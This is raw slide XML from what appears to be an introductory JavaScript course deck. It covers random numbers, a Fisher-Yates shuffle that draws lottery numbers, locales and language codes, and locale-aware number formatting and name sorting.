                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>print</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values</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use</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> this:</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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for</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value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>of</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entries</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value</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err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>if</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includes</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Vue</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Vue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>found</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indexOf</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Angular</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AngularJS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remove</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>item</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a</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filter</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x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=&gt;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x</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AngularJS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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8B05EC48-30E5-4980-AA2E-C12176182807}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Creating Random Numbers</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="93187" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FDBAFC89-76EB-4174-A47F-CE4D44BA9F6F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"</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"http://www.w3.org/TR/html4/loose.dtd"&gt;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&lt;html&gt;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&lt;head&gt;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&lt;meta http-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>equiv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>="content-type" content="text/html; charset=utf-8"&gt;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&lt;title&gt;Random Numbers&lt;/title&gt;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&lt;/head&gt;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&lt;body&gt;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&lt;script type="text/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"&gt;</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 return random integer between a and b, b included </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function </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>randInt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(a, b) {</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return </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Math.floor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Math.random</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>()*(b-a+1)+a);</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    </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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for(var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=0;i&lt;20;i++) {</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>document.writeln</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>randInt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(1,6)+"&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>br</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    }</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&lt;/script&gt;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&lt;/body&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>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&lt;/html&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="020703090202050204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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{185B68C1-066A-41E0-B743-3036A846AFE6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Random Lottery Numbers from 1-40</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="101379" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{066C7236-34B8-437E-B525-285D8090C9C8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">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return random integer between a and b, b included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function randInt(a, b)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return Math.floor(Math.random()*(b-a+1)+a);</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shuffles an array into random order using Knuths' algorithm 235 (Fisher-Yates shuffle)</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function shuffle(numberList)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let i, j, tmp, n = numberList.length-1;</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for(i=0;i&lt;n;i++)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j = randInt(i, n);</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 swap contents of numberList[i] and numberList[j]</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tmp = numberList[i];</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numberList[i] = numberList[j];</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numberList[j] = tmp;</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let numbers =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for(let i=1;i&lt;=40;i++)</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numbers.push(i);</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shuffle(numbers); // shuffle numbers to random order</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row = numbers.slice(0, 7); // take first 7 numbers</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numbersrow.sort((a, b) =&gt; a-b); // sort them in ascending order</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for(let number of row) {</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    document.writeln(number+"&lt;br&gt;");</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49"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BF71BBB-07D6-492B-BE35-667A04F9637B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Locale</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{24BF02E9-55F2-40DC-A37D-3E6FA271AC89}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>locale is a set of parameters that defines the user's language, region and any special variant preferences that the user wants to see in their user interface, such as:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>number format setting 		1,234.567 or 1.234,567 or 1 234,567</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>character classification, case conversion</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>date-time format setting	9/24/2020, 24.9.2020, 2020-9-24</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>string collation (sorting) setting	e.g. in German a and ä equal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>currency format setting.	5,70 € and 5,70 SEK but $5.70 and £5,70</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Internationalization is the process of making program support multiple languages without engineering changes e.g. using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Gnu gettext</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Localization is the process of adapting internationalized software for a specific region or language by translating text and adding locale-specific components.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="342725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695A3A4-97C7-4D99-9698-1F995E26AF39}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Language Codes or Locale Codes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5B778383-44DB-41F4-9287-1185126D4725}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Two letter codes define language e.g. "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>" (English), "es" (Spanish), "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>ru</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>" (Russian), "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>sv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>" (Swedish), "de" (German), "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>fr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>" (French), "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>zh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>" (Chinese), "ja" (Japanese), "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>ar</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>" (Arabic) or "fi" (Finnish).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Two letter language code dash (-) and country code, will country or region specific variation e.g. "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>-US", "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>-GB", "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>-CA" and "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>-IN" or "es-ES" and "es-MX" or "fi-FI" or "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>zh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>-CN" and "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>zh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>-HK".</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Language codes can be even more complex, such as "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>-US-u-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>kn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>-true" to enable numeric comparison using US English rules or '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>-US-u-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>kf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>-lower' or '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>-US-u-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>kf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>-upper' to define sorting preference for lower and upper case.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="219258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6E7CCE7-0D44-40D5-8500-030C3B4E8CF3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0"/>
              <a:t>Locale Specific String Sorting and Display of Numbers</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1F97887E-BC14-4771-93D9-92C0FDCF2D50}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1417638"/>
            <a:ext cx="10972800" cy="5069160"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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Converting Numbers to localized strings</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let</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 = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>1234.56789</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1234.56789</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x</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toLocaleString</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en</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"1,234.568"</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x</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toLocaleString</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"de"</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"1.234,568"</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x</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toLocaleString</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"fi"</a:t>
            </a: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"1 234,568"</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names</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"Aino"</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"Wille"</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"Valtteri"</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"Ville"</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Viivi</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Örkki</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örkki</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aito</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"uber"</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über</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names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sort</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names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sort</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a</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a</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localeCompare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en</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names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sort</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a</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a</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localeCompare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"de"</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names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sort</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a</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a</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localeCompare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"fi"</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better performance on large arrays</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names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sort</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Intl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Collator</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"fi"</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compare</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names</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
